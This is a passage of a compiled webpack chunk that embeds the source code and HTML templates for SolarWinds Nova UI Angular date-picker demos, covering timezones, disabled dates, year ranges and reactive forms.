rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\nimport { FormControl } from "@angular/forms";\nimport moment, { Moment } from "moment/moment";\n\nimport { IToastService, ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-date-picker-insignificant-example",\n    templateUrl: "./date-picker-insignificant.example.component.html",\n})\nexport class DatePickerInsignificantExampleComponent {\n    public dt: Moment = moment().endOf("day");\n    public selectedDate: Date;\n    public control = new FormControl(this.dt, { nonNullable: true });\n\n    constructor(@Inject(ToastService) private toastService: IToastService) {}\n\n    public dateChanged(event: Moment): void {\n        this.selectedDate = new Date(event.valueOf());\n        this.toastService.info({\n            message: $localize`Selected date: ${event.toString()}`,\n        });\n    }\n}\n'},28170:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-date-picker\n    [inline]="true"\n    datepickerMode="year"\n    minMode="month"\n    maxMode="year"\n>\n</nui-date-picker>\n'},43350:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-date-picker-modes-range-example",\n    templateUrl: "./date-picker-modes-range.example.component.html",\n})\nexport class DatePickerModesRangeExampleComponent {}\n'},58722:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<section class="demo-options-section">\n    <nui-form-field caption="Date Picker" [control]="control">\n        <nui-date-picker\n            [formControl]="control"\n            (valueChange)="onValueChange($event)"\n        ></nui-date-picker>\n        <nui-validation-message for="required">\n            This field is required\n        </nui-validation-message>\n        <nui-validation-message for="invalidFormat">\n            Invalid format\n        </nui-validation-message>\n    </nui-form-field>\n    <p class="mt-2">Value: {{ selectedDate }}</p>\n    <p class="mt-2">Valid: {{ control.valid }}</p>\n    <p class="mt-2">Touched: {{ control.touched }}</p>\n    <p class="mt-2">Dirty: {{ control.dirty }}</p>\n</section>\n'},83390:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormControl, Validators } from "@angular/forms";\nimport moment, { Moment } from "moment/moment";\n\n@Component({\n    selector: "nui-date-picker-reactive-forms-example",\n    templateUrl: "./date-picker-reactive-form.example.component.html",\n})\nexport class DatePickerReactiveFormExampleComponent {\n    public dt: Moment = moment();\n    public selectedDate: Date = new Date(this.dt.valueOf());\n    public control = new FormControl(this.dt, Validators.required);\n\n    constructor() {}\n\n    onValueChange(event: Moment): void {\n        this.selectedDate = new Date(event.valueOf());\n    }\n}\n'},50118:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-date-picker [inline]="true" [showWeeks]="true"> </nui-date-picker>\n'},68050:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-date-picker-show-weeks-example",\n    templateUrl: "./date-picker-show-weeks.example.component.html",\n})\nexport class DatePickerShowWeeksExampleComponent {}\n'},51180:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Basic Datepicker</h2>\n<nui-date-picker id="nui-demo-datepicker-basic"> </nui-date-picker>\n\n<hr />\n\n<h2>Datepicker with preserve insignificant</h2>\n<nui-date-picker\n    id="nui-demo-datepicker-preserve"\n    [value]="dtPreserve"\n    [preserveInsignificant]="true"\n    (valueChange)="dateChangedPreserved($event)"\n>\n</nui-date-picker>\n<p>\n    Selected date:\n    <span id="nui-demo-datepicker-active-date-value-preserve">{{\n        localActiveDatePreserve.format()\n    }}</span>\n</p>\n\n<hr />\n\n<h2>Inline datepicker</h2>\n<nui-date-picker\n    id="nui-demo-datepicker-inline"\n    [value]="dt"\n    [inline]="true"\n    (valueChange)="dateChanged($event)"\n>\n</nui-date-picker>\n<p>\n    Selected date:\n    <span id="nui-demo-datepicker-active-date-value">{{\n        localActiveDate.format()\n    }}</span>\n</p>\n\n<hr />\n\n<h2>Datepicker with min and max values</h2>\n<nui-date-picker\n    id="nui-demo-datepicker-min-max"\n    [value]="dt"\n    [minDate]="minDate"\n    [maxDate]="maxDate"\n    (valueChange)="dateChangedMinMax($event)"\n>\n</nui-date-picker>\n<p>\n    Selected date:\n    <span id="nui-demo-datepicker-min-max-value">{{\n        localActiveDateMinMax.format()\n    }}</span>\n</p>\n<p>\n    Min date:\n    <span id="nui-demo-datepicker-min-date">{{ minDate.format() }}</span>\n</p>\n<p>\n    Max date:\n    <span id="nui-demo-datepicker-max-date">{{ maxDate.format() }}</span>\n</p>\n\n<hr />\n\n<h2>Datepicker with reactive form</h2>\n<form [formGroup]="reactiveDatepickerForm">\n    <nui-date-picker\n        id="nui-demo-date-picker-reactive"\n        [isInErrorState]="reactiveDatepickerForm.controls[\'datePicker\'].invalid"\n        formControlName="datePicker"\n    >\n    </nui-date-picker>\n</form>\n\n<hr />\n\n<h2>Datepicker with disabled dates</h2>\n<nui-date-picker\n    id="nui-demo-datepicker-disabled-dates"\n    [value]="dt"\n    [disabledDates]="dateDisabled"\n    (valueChange)="dateChangedDisabledDates($event)"\n>\n</nui-date-picker>\n<p>\n    Selected date:\n    <span id="nui-demo-datepicker-disabled-dates-value">{{\n        localActiveDateDisabledDates.format()\n    }}</span>\n</p>\n<p>\n    Dates, disabled with <code>dateDisabled</code>: {{ dateDisabled | json }}}\n</p>\n\n<hr />\n\n<h2>Datepicker with disabled today button</h2>\n<nui-date-picker\n    id="nui-demo-datepicker-disabled-today"\n    [disabledDates]="todayDateDisabled"\n>\n</nui-date-picker>\n\n<hr />\n\n<h2>Datepicker with initial date, time and preserve insignificant</h2>\n<nui-date-picker\n    id="nui-demo-datepicker-init-date-preserve"\n    [value]="initDate"\n    [preserveInsignificant]="true"\n    (valueChange)="initDateChangedPreserved($event)"\n>\n</nui-date-picker>\n<div id="nui-demo-datepicker-init-date-value-preserve">\n    {{ initDatePreserve.format() }}\n</div>\n\n<hr />\n\n<h2>Datepicker with custom first day of the week</h2>\n<nui-date-picker\n    id="nui-demo-datepicker-custom-first-day-of-the-week"\n    [startingDay]="5"\n>\n</nui-date-picker>\n\n<hr />\n\n<h2>Datepicker with custom date format</h2>\n<nui-date-picker\n    id="nui-demo-datepicker-custom-date-format"\n    dateFormat="MM/DD/YY"\n>\n</nui-date-picker>\n'},26492:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormBuilder } from "@angular/forms";\nimport moment, { Moment } from "moment/moment";\n\nimport { IDatePickerDisabledDate } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-date-picker-test",\n    templateUrl: "./date-picker-test.component.html",\n})\nexport class DatePickerTestComponent {\n    public dt: Moment;\n    public dtPreserve: Moment;\n    public minDate: Moment;\n    public maxDate: Moment;\n    public localActiveDate: Moment;\n    public localActiveDatePreserve: Moment;\n    public localActiveDateMinMax: Moment;\n    public localActiveDateDisabledDates: Moment;\n    public initDate: Moment;\n    public initDatePreserve: Moment;\n    public month: number;\n    public year: number;\n    public caption: string;\n    public reactiveDatepickerForm;\n    public dateDisabled: IDatePickerDisabledDate[];\n    public todayDateDisabled: IDatePickerDisabledDate[];\n\n    constructor(private formBuilder: FormBuilder) {\n        this.reactiveDatepickerForm = this.formBuilder.group({\n            datePicker: this.formBuilder.control(moment()),\n        });\n        this.dt = moment();\n        this.dtPreserve = moment();\n        this.localActiveDate = this.dt;\n        this.localActiveDatePreserve = this.dtPreserve;\n        this.localActiveDateMinMax = this.dt;\n        this.localActiveDateDisabledDates = this.dt;\n        this.month = this.dt.month() + 1;\n        this.year = this.dt.year();\n        this.minDate = moment({\n            year: this.year,\n            month: this.month - 1,\n            date: 5,\n        });\n        this.maxDate = moment({\n            year: this.year,\n            month: this.month - 1,\n            date: 25,\n        });\n        this.caption = "Custom caption for date-picker";\n        this.initDate = moment().utcOffset(0).hour(23).minute(15).add(1, "day");\n        this.initDatePreserve = this.initDate;\n        this.dateDisabled = [\n            {\n                date: moment({\n                    year: this.year,\n                    month: this.month - 1,\n                    date: 10,\n                }),\n                mode: "day",\n            },\n            {\n                date: moment({\n                    year: this.year,\n                    month: this.month - 1,\n                    date: 11,\n                }),\n                mode: "day",\n            },\n            {\n                date: moment({\n                    year: this.year,\n                    month: this.month - 1,\n                    date: 12,\n                }),\n                mode: "day",\n            },\n            {\n                date: moment({ year: this.year, month: this.month, date: 12 }),\n                mode: "month",\n            },\n            {\n                date: moment({\n                    year: this.year + 1,\n                    month: this.month - 1,\n                    date: 12,\n                }),\n                mode: "year",\n            },\n        ];\n        this.todayDateDisabled = [\n            {\n                date: this.dt,\n                mode: "day",\n            },\n        ];\n    }\n\n    public dateChanged(event: any): void {\n        this.localActiveDate = event;\n    }\n\n    public dateChangedPreserved(event: any): void {\n        this.localActiveDatePreserve = event;\n    }\n\n    public dateChangedMinMax(event: any): void {\n        this.localActiveDateMinMax = event;\n    }\n\n    public dateChangedDisabledDates(event: any): void {\n        this.localActiveDateDisabledDates = event;\n    }\n\n    public initDateChangedPreserved(event: any): void {\n        this.initDatePreserve = event;\n    }\n}\n'},28850:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<section class="demo-options-section">\n    <nui-form-field caption="Date Picker" [control]="control">\n        <nui-date-picker\n            [formControl]="control"\n            [handleTimezone]="true"\n        ></nui-date-picker>\n    </nui-form-field>\n    <p class="mt-2">Value: {{ selectedDate }}</p>\n\n    <nui-combobox\n        [itemsSource]="displayedZones"\n        [value]="initialZone"\n        (changed)="textboxChanged($event)"\n        placeholder="Select item"\n        i18n-placeholder\n    ></nui-combobox>\n</section>\n'},47310:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormControl, Validators } from "@angular/forms";\nimport moment from "moment-timezone";\n\nimport { ISelectChangedEvent } from "@nova-ui/bits";\n\nconst zonesData = require("moment-timezone/data/packed/latest.json");\nmoment.tz.add(zonesData.zones);\n\n@Component({\n    selector: "nui-date-picker-timezone-example",\n    templateUrl: "./date-picker-timezone.example.component.html",\n})\nexport class DatePickerTimezoneExampleComponent {\n    public control = new FormControl(moment(), {\n        validators: [Validators.required],\n        nonNullable: true,\n    });\n    public zones: string[] = zonesData.zones.map(\n        (z: string) => z.split("|")[0]\n    );\n    public displayedZones = this.zones;\n    public initialZone = "Australia/Sydney";\n\n    constructor() {\n        this.control.setValue(this.control.value.tz(this.initialZone));\n    }\n\n    get selectedDate(): string {\n        return this.control.value.toString();\n    }\n\n    public textboxChanged(searchQuery: ISelectChangedEvent<any>): void {\n        const val = searchQuery.newValue;\n        this.displayedZones = this.zones.filter((z) =>\n            z.toLowerCase().includes(val.toLowerCase())\n        );\n\n        if (this.zones.find((z) => z === val)) {\n            this.control.setValue(this.control.value.tz(val));\n        }\n    }\n}\n'},14596:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-date-picker\n    id="nui-demo-datepicker-value-change"\n    [inline]="true"\n    (valueChange)="dateChanged($event)"\n>\n</nui-date-picker>\n\n<div id="active-date-value">\n    {{ selectedDate }}\n</div>\n'},74884:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\nimport moment, { Moment } from "moment/moment";\n\nimport { IToastService, ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-date-picker-value-change-example",\n    templateUrl: "./date-picker-value-change.example.component.html",\n})\nexport class DatePickerValueChangeExampleComponent {\n    public selectedDate: Date = new Date(moment().valueOf());\n\n    constructor(@Inject(ToastService) private toastService: IToastService) {}\n\n    public dateChanged(event: Moment): void {\n        this.selectedDate = new Date(event.valueOf());\n        this.toastService.info({\n            message: $localize`Selected date: ${event.toString()}`,\n        });\n    }\n}\n'},63742:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="row">\n        <div class="col">\n            <div class="row"><h3>Basic Usage</h3></div>\n            <div class="row">\n                <nui-date-picker\n                    id="nui-basic-usage-datepicker"\n                    [value]="initDate"\n                    [preserveInsignificant]="true"\n                >\n                </nui-date-picker>\n            </div>\n            <hr />\n        </div>\n\n        <div class="col">\n            <div class="row"><h3>Disabled</h3></div>\n            <div class="row">\n                <nui-date-picker\n                    id="nui-disabled-datepicker"\n                    [value]="initDate"\n                    [isDisabled]="true"\n                    [preserveInsignificant]="true"\n                >\n                </nui-date-picker>\n            </div>\n            <hr />\n        </div>\n\n        <div class="col">\n            <div class="row"><h3>Error State</h3></div>\n            <div class="row">\n                <form [formGroup]="myForm">\n                    <div class="form-group">\n                        <nui-date-picker\n                            id="nui-error-state-datepicker"\n                            formControlName="datePickerFormControl"\n                            [preserveInsignificant]="true"\n                            [isInErrorState]="true"\n                        >\n                        </nui-date-picker>\n                    </div>\n                </form>\n            </div>\n            <hr />\n        </div>\n    </div>\n\n    <div class="row">\n        <div class="col">\n            <div class="row"><h3>Inline State</h3></div>\n            <div class="row">\n                <nui-date-picker\n                    id="nui-inline-state-datepicker"\n                    [value]="initDate"\n                    [inline]="true"\n                    [preserveInsignificant]="true"\n                >\n                </nui-date-picker>\n            </div>\n            <hr />\n        </div>\n\n        <div class="col">\n            <div class="row"><h3>Current Month State</h3></div>\n            <div class="row">\n                <nui-date-picker\n                    id="nui-current-month-state-datepicker"\n                    [value]="initDate"\n                    [inline]="true"\n                    [onlyCurrentMonth]="true"\n                    [preserveInsignificant]="true"\n                >\n                </nui-date-picker>\n            </div>\n            <hr />\n        </div>\n\n        <div class="col">\n            <div class="row"><h3>Show Weeks</h3></div>\n            <div class="row">\n                <nui-date-picker\n                    id="nui-show-weeks-datepicker"\n                    [value]="initDate"\n                    [showWeeks]="true"\n                    [inline]="true"\n                    [preserveInsignificant]="true"\n                >\n                </nui-date-picker>\n            </div>\n            <hr />\n        </div>\n    </div>\n\n    <div class="row">\n        <div class="col">\n            <div class="row"><h3>Modes (month)</h3></div>\n            <div class="row">\n                <nui-date-picker\n                    id="nui-modes-month-state-datepicker"\n                    [value]="initDate"\n                    datepickerMode="month"\n                    [inline]="true"\n                    [preserveInsignificant]="true"\n                >\n                </nui-date-picker>\n            </div>\n            <hr />\n        </div>\n\n        <div class="col">\n            <div class="row"><h3>Modes (year)</h3></div>\n            <div class="row">\n                <nui-date-picker\n                    id="nui-modes-year-state-datepicker"\n                    [value]="initDate"\n                    datepickerMode="year"\n                    [inline]="true"\n                    [preserveInsignificant]="true"\n                >\n                </nui-date-picker>\n            </div>\n            <hr />\n        </div>\n\n        <div class="col">\n            <div class="row"><h3>Years Range</h3></div>\n            <div class="row">\n                <nui-date-picker\n                    id="nui-modes-year-range-datepicker"\n                    [value]="initDate"\n                    [inline]="true"\n                    datepickerMode="year"\n                    [yearRange]="5"\n                >\n                    [preserveInsignificant]="true">\n                </nui-date-picker>\n            </div>\n            <hr />\n        </div>\n\n        <div class="col">\n            <div class="row"><h3>Formatting</h3></div>\n            <div class="row">\n                <nui-date-picker\n                    id="nui-formatting-state-datepicker"\n                    [value]="initDate"\n                    [inline]="true"\n                    formatDay="Do"\n                    formatMonth="MMM"\n                    formatYear="YY"\n                    formatDayHeader="ddd"\n                    formatDayTitle="MMM YY"\n                    formatMonthTitle="YY"\n                    [preserveInsignificant]="true"\n                >\n                </nui-date-picker>\n            </div>\n            <hr />\n        </div>\n    </div>\n</div>\n'},79770:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\nimport moment, { Moment } from "moment/moment";\n\n@Component({\n    selector: "date-picker-visual-test",\n    templateUrl: "./date-picker-visual-test.component.html",\n})\nexport class DatePickerVisualTestComponent {\n    public initDate: Moment = moment().set({\n        year: 2017,\n        month: 11,\n        date: 23,\n        hour: 15,\n        minute: 30,\n    });\n    public emptyDate = moment("");\n    public myForm;\n\n    constructor(private formBuilder: FormBuilder) {\n        this.myForm = this.formBuilder.group({\n            datePickerFormControl: this.formBuilder.control(this.emptyDate, [\n                Validators.required,\n            ]),\n        });\n    }\n}\n'},98154:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-date-picker [isInErrorState]="true"> </nui-date-picker>\n'},11158:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-date-picker-with-error-example",\n    templateUrl: "./date-picker-with-error.example.component.html",\n})\nexport class DatePickerWithErrorExampleComponent {}\n'},54150:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-date-picker [inline]="true" datepickerMode="year" [yearRange]="5">\n</nui-date-picker>\n'},78386:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-date-picker-year-range-example",\n    templateUrl: "./date-picker-year-range.example.component.html",\n})\nexport class DatePickerYearRangeExampleComponent {}\n'},57079:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { FormsModule, ReactiveFormsModule } from "@angular/forms";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiDatePickerModule,\n    NuiDocsModule,\n    NuiFormFieldModule,\n    NuiMessageModule,\n    NuiSelectModule,\n    NuiValidationMessageModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    DatePickerBasicExampleComponent,\n    DatePickerCalendarNavigatedExampleComponent,\n    